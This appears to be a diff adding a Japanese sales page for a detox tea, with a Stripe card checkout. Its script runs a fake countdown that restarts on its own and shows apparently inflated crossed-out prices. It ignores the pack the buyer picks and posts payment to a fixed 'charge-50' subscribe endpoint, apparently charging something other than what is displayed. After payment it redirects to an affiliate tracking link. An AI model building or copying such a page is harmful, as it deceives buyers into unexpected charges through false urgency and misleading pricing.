@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HealthyTox • デトックスティー特別オファー（日本）</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet"/>
+<style>
+  :root{
+    --brand:#ee2c7c;
+    --brand-2:#22a559;
+    --ink:#0e1116;
+    --muted:#5b6472;
+    --line:#e5e7eb;
+    --radius:18px;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font:16px/1.5 Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+    color:var(--ink);
+    background:#fff;
+  }
+
+  /* 上部リボン */
+  .ribbon{background:#0e2b5c;color:#fff;font-weight:800;text-transform:uppercase;letter-spacing:.3px}
+  .ribbon .wrap{display:flex;align-items:center;gap:14px;padding:10px 16px;max-width:1200px;margin:0 auto}
+  .timer{margin-left:auto;display:flex;gap:18px;font-weight:900}
+  .timer span{display:flex;gap:6px;align-items:center}
+  .pill{background:rgba(255,255,255,.12);padding:4px 10px;border-radius:999px}
+
+  /* ヒーロー */
+  .hero{background:#fdf6f9;border-bottom:1px solid var(--line)}
+  .hero .wrap{max-width:1200px;margin:0 auto;padding:30px 16px;display:grid;grid-template-columns:1.2fr 1fr;gap:24px;align-items:center}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:900;font-size:40px}
+  .leaf{width:28px;height:28px;border-radius:50%;background:var(--brand-2);display:inline-block;position:relative}
+  .leaf:after{content:"";position:absolute;inset:6px 10px 6px 6px;border-radius:50% 10% 50% 50%/50% 10% 50% 50%;background:#fff;transform:rotate(-35deg)}
+  .hero h1{font-size:36px;margin:14px 0 10px}
+  .badges{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:16px}
+  .badge{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center}
+  .badge b{display:block;margin-top:6px}
+  .product-hero{min-height:260px;border-radius:22px;border:1px solid var(--line);background:#fff url('maindetox.jpg') center/cover no-repeat}
+
+  /* メイン */
+  .main{max-width:1200px;margin:0 auto;padding:24px 16px;display:grid;grid-template-columns:1fr 420px;gap:24px}
+  @media (max-width:1000px){.hero .wrap{grid-template-columns:1fr}.main{grid-template-columns:1fr}}
+
+  .card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);box-shadow:0 6px 20px rgba(2,18,8,.05)}
+  .card .pad{padding:18px}
+
+  /* セット */
+  .packs{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+  @media (max-width:640px){.packs{grid-template-columns:1fr}}
+  .pack{border:2px solid var(--line);border-radius:16px;padding:14px;cursor:pointer;position:relative;display:grid;gap:6px;align-content:start}
+  .pack.active{border-color:var(--brand);box-shadow:0 0 0 3px rgba(238,44,124,.15)}
+  .tag{position:absolute;top:10px;left:10px;background:#0e2b5c;color:#fff;font-size:12px;padding:4px 8px;border-radius:999px}
+  .old{color:#9aa2ad;text-decoration:line-through;font-weight:600}
+  .price{font-size:26px;font-weight:900;color:#0e7f3d}
+  .pack img{width:120px;height:auto}
+
+  /* チェックアウト */
+  .checkout .head{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);padding:14px 18px}
+  .checkout h3{margin:0;font-size:20px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .row > *{min-width:0}
+
+  /* 電話 */
+  .phone{display:flex;gap:10px;width:100%}
+  .phone select{flex:0 0 170px}
+  .phone input{flex:1 1 0%;min-width:0;width:100%}
+
+  .input,.el,select{width:100%;display:block;padding:12px 14px;border:1.6px solid var(--line);border-radius:12px;background:#fff;color:#000}
+  .input:focus,.el:focus,select:focus{outline:none;border-color:#ffd7e8;box-shadow:0 0 0 3px rgba(238,44,124,.15)}
+  .el{background:#fff}
+
+  .paybtn{width:100%;padding:14px 16px;border-radius:12px;background:var(--brand);color:#fff;font-weight:900;border:none;cursor:pointer}
+  .paybtn:hover{filter:saturate(1.06) brightness(0.98)}
+  .muted{color:var(--muted);font-size:14px}
+  .trust{display:flex;gap:14px;justify-content:center;padding:12px;border-top:1px solid var(--line)}
+  .trust img{height:22px;opacity:.8}
+
+  .list{display:grid;gap:10px;margin-top:6px}
+  .list .li{display:flex;gap:10px}
+  .check{width:18px;height:18px;border-radius:4px;background:#ffebf4;display:inline-flex;align-items:center;justify-content:center}
+  .check:after{content:"✓";font-size:12px;color:#d41164}
+
+  /* オーバーレイ */
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;z-index:100}
+  .overlay[aria-hidden="false"]{display:flex}
+  .box{background:#fff;border-radius:16px;max-width:520px;width:92vw;padding:22px;text-align:center;box-shadow:0 10px 28px rgba(0,0,0,.3)}
+  .bar{height:10px;width:100%;background:#eef2f5;border-radius:999px;overflow:hidden;margin-top:10px}
+  .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--brand),#ff9ec5);animation:load 2.2s ease-in-out infinite;border-radius:inherit}
+  @keyframes load{0%{width:0%}60%{width:85%}100%{width:100%}}
+
+  #err{margin-top:10px;font-size:14px;color:#b00020;background:#fde9eb;border:1px solid #e5b2b8;border-radius:10px;padding:8px;display:none}
+  #err[aria-hidden="false"]{display:block}
+
+  footer{padding:30px 16px;color:#3b4450;border-top:1px solid var(--line);text-align:center}
+</style>
+</head>
+<body>
+  <!-- 上部リボン -->
+  <div class="ribbon">
+    <div class="wrap">
+      <div><span class="pill">期間限定オファー</span></div>
+      <div class="timer" aria-live="polite">
+        <span><strong id="hh">00</strong> 時間</span>
+        <span><strong id="mm">15</strong> 分</span>
+        <span><strong id="ss">00</strong> 秒</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ヒーロー -->
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <div class="brand"><span class="leaf"></span> HealthyTox</div>
+        <h1>デトックス エナジャイジング ティー — 毎日、もっと軽やかに。</h1>
+        <div class="badges">
+          <div class="badge">⚖️ <b>体重管理をサポート</b></div>
+          <div class="badge">🫧 <b>お腹のハリを軽減</b></div>
+          <div class="badge">⚡ <b>代謝を活性化</b></div>
+          <div class="badge">🧘 <b>心身のバランスに</b></div>
+        </div>
+      </div>
+      <div class="product-hero"></div>
+    </div>
+  </section>
+
+  <!-- メイン -->
+  <section class="main">
+    <!-- 左：商品セット -->
+    <div class="card">
+      <div class="pad">
+        <div class="packs" id="packGrid">
+          <div class="pack active" data-pack="3">
+            <span class="tag">人気 No.1</span>
+            <img src="d3.jpg" alt="3個セット">
+            <h4>デトックスティー 3個セット <small>（84袋）</small></h4>
+            <div class="old">¥28,783</div>
+            <div class="price">¥8,616</div>
+          </div>
+          <div class="pack" data-pack="2">
+            <img src="d2.jpg" alt="2個セット">
+            <h4>デトックスティー 2個セット <small>（56袋）</small></h4>
+            <div class="old">¥22,145</div>
+            <div class="price">¥6,599</div>
+          </div>
+          <div class="pack" data-pack="1">
+            <img src="d1.jpg" alt="1個">
+            <h4>デトックスティー 1個 <small>（28袋）</small></h4>
+            <div class="old">¥13,229</div>
+            <div class="price">¥3,996</div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:14px">
+          <div class="pad">
+            <h3>選ばれる理由</h3>
+            <div class="list">
+              <div class="li"><span class="check"></span><div><b>30日間返金保証</b> — 安心してお試しください。</div></div>
+              <div class="li"><span class="check"></span><div><b>安心決済</b> — 高速かつ安全なチェックアウト。</div></div>
+              <div class="li"><span class="check"></span><div><b>プライバシー保護</b> — 256ビットSSL暗号化。</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 右：チェックアウト -->
+    <div class="card checkout" id="checkoutCard">
+      <div class="head">
+        <h3>エクスプレス決済</h3>
+        <div class="muted">Stripe による決済</div>
+      </div>
+      <div class="pad">
+        <div class="row" style="margin-bottom:8px">
+          <input id="emailInput" class="input" type="email" placeholder="メールアドレス"/>
+          <input id="nameInput" class="input" placeholder="氏名"/>
+        </div>
+        <div style="margin-bottom:8px">
+          <div class="phone">
+            <select id="phonePrefix" class="input" aria-label="国番号"></select>
+            <input id="phoneNumber" class="input" type="tel" inputmode="tel" placeholder="電話番号"/>
+          </div>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingStreet" class="input" placeholder="住所（番地・建物名）"/>
+          <input id="billingCity" class="input" placeholder="市区町村"/>
+        </div>
+        <div class="row" style="margin-bottom:8px">
+          <input id="billingPostcode" class="input" placeholder="郵便番号"/>
+          <select id="billingCountry" class="input"></select>
+        </div>
+
+        <div class="muted" style="margin:8px 0 4px">カード番号</div>
+        <div id="card-number" class="el"></div>
+        <div class="row" style="margin-top:8px">
+          <div>
+            <div class="muted" style="margin:8px 0 4px">有効期限</div>
+            <div id="card-expiry" class="el"></div>
+          </div>
+          <div>
+            <div class="muted" style="margin:8px 0 4px">CVC</div>
+            <div id="card-cvc" class="el"></div>
+          </div>
+        </div>
+
+        <div id="err" role="alert" aria-hidden="true"></div>
+
+        <button id="payNow" class="paybtn" style="margin-top:12px">今すぐ注文</button>
+        <p class="muted" style="margin:10px 0 0">🔒 SSL 256-bit による安全な決済</p>
+      </div>
+      <div class="trust">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa"/>
+        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard"/>
+        <img src="https://charmr.xyz/logos/amex.png" alt="Amex"/>
+        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="GPay"/>
+      </div>
+    </div>
+  </section>
+
+  <!-- ローディング -->
+  <div id="overlay" class="overlay" aria-hidden="true">
+    <div class="box">
+      <h3>お支払いを処理しています…</h3>
+      <div class="bar"><span></span></div>
+      <p class="muted">数秒お待ちください。</p>
+    </div>
+  </div>
+
+  <footer>
+    <b>免責事項：</b> 本製品は医薬品ではありません。疾病の診断・治療・予防を目的とするものではありません。妊娠・授乳中、治療中の方は医師にご相談ください。
+  </footer>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    /* 15分カウントダウン（ループ） */
+    (function countdownLoop(){
+      const hh=document.getElementById('hh'), mm=document.getElementById('mm'), ss=document.getElementById('ss');
+      const DURATION_MS = 15*60*1000;
+      let end = Date.now() + DURATION_MS;
+      const fmt=n=>String(n).padStart(2,'0');
+      (function tick(){
+        const left = Math.max(0, end - Date.now());
+        const s = Math.floor(left/1000)%60;
+        const m = Math.floor(left/60000)%60;
+        const h = Math.floor(left/3600000);
+        hh.textContent=fmt(h); mm.textContent=fmt(m); ss.textContent=fmt(s);
+        if(left<=0){ end = Date.now() + DURATION_MS; }
+        requestAnimationFrame(tick);
+      })();
+    })();
+
+    /* 日本のみ：国番号 + 国 */
+    (function initJPOnly(){
+      const prefixEl = document.getElementById('phonePrefix');
+      const countryEl = document.getElementById('billingCountry');
+      const phoneEl   = document.getElementById('phoneNumber');
+
+      prefixEl.innerHTML = '';
+      prefixEl.add(new Option('+81 — 日本', '+81', true, true));
+
+      countryEl.innerHTML = '';
+      countryEl.add(new Option('日本', 'JP', true, true));
+
+      if (phoneEl) { phoneEl.disabled=false; phoneEl.readOnly=false; }
+    })();
+
+    /* セット選択（UIのみ） */
+    document.querySelectorAll('.pack').forEach(el=>{
+      el.addEventListener('click',()=>{
+        document.querySelectorAll('.pack').forEach(p=>p.classList.remove('active'));
+        el.classList.add('active');
+      });
+    });
+
+    /* エンドポイント（同一オリジン or ローカル） */
+    const API_BASE = (location.origin && location.origin.startsWith('http')) ? location.origin : 'http://localhost:5000';
+    const SUBSCRIBE_URL = `${API_BASE}/api/stripe/charge-50`;
+
+    /* Stripe（既存フローを踏襲） */
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const stripe = Stripe(PUBLISHABLE_KEY);
+    const elements = stripe.elements();
+    const cardNumber=elements.create("cardNumber");
+    const cardExpiry=elements.create("cardExpiry");
+    const cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");
+
+    const $err=document.getElementById("err");
+    const overlay=document.getElementById('overlay');
+    const showError=m=>{$err.textContent=m;$err.setAttribute('aria-hidden','false');}
+    const hideError=()=>{$err.textContent="";$err.setAttribute('aria-hidden','true');}
+    const showLoading=()=>overlay.setAttribute('aria-hidden','false');
+    const hideLoading=()=>overlay.setAttribute('aria-hidden','true');
+
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const phoneNumber=document.getElementById('phoneNumber');
+    const billingStreet=document.getElementById('billingStreet');
+    const billingCity=document.getElementById('billingCity');
+    const billingPostcode=document.getElementById('billingPostcode');
+
+    document.getElementById("payNow").onclick = async () => {
+      hideError(); showLoading();
+
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const fullPhone = rawPhone ? `+81${rawPhone}` : undefined;
+
+      const addr = {
+        line1:(billingStreet?.value||'').trim()||undefined,
+        city:(billingCity?.value||'').trim()||undefined,
+        postal_code:(billingPostcode?.value||'').trim()||undefined,
+        country:'JP'
+      };
+
+      const pm = await stripe.createPaymentMethod({
+        type:"card",
+        card:cardNumber,
+        billing_details:{
+          name:nameInput.value||undefined,
+          email:emailInput.value||undefined,
+          phone:fullPhone,
+          address:addr
+        }
+      });
+      if(pm.error){ hideLoading(); showError(pm.error.message); return; }
+
+      try{
+        const res = await fetch(SUBSCRIBE_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            paymentMethodId:pm.paymentMethod.id,
+            name:nameInput.value,
+            email:emailInput.value,
+            phone:fullPhone,
+            address:addr
+          })
+        });
+        const data = await res.json();
+        if(data.error){ hideLoading(); showError(data.error); return; }
+        if(!data.clientSecret){ hideLoading(); showError("決済に失敗しました"); return; }
+
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error){ hideLoading(); showError(conf.error.message); return; }
+        if(!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){
+          hideLoading(); showError("決済が完了しませんでした"); return;
+        }
+
+        // 成功後の遷移
+        window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7?";
+      }catch(e){ hideLoading(); showError(e.message||"エラーが発生しました"); }
+    };
+  </script>
+<!-- GoAffPro loader (kept, matches atlas.html integration) -->
+  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+</body>
+</html>
+</body>
+</html>
